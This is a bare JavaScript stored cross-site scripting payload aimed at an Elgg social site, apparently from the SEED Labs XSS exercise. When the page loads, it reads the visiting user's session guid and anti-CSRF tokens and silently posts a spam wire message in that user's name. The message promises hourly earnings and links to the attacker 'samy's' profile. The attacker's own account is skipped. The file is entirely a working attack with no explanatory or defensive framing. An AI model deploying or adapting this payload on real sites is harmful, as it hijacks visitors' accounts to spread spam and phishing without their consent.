<script type="text/javascript">
   window.onload = function() {
      
       var guid = elgg.session.user.guid;
       var ts = '&__elgg_ts='+elgg.security.token.__elgg_ts;
       var token = '&__elgg_token='+elgg.security.token.__elgg_token;


       var wirePost = 'To+earn+12+USD%2FHour%28%21%29%2C+visit+now+http%3A%2F%2Fwww.seed-server.com%2Fprofile%2Fsamy.'


       var sendurl = 'http://www.seed-server.com/action/thewire/add';
       var content = token+ts+'&body='+wirePost;


       if(guid != 59) {
           var Ajax = null;
           Ajax = new XMLHttpRequest();
           Ajax.open('POST', sendurl, true);
           Ajax.setRequestHeader('Host', 'www.seed-server.com');
           Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
           Ajax.send(content);
       }
   }
</script>
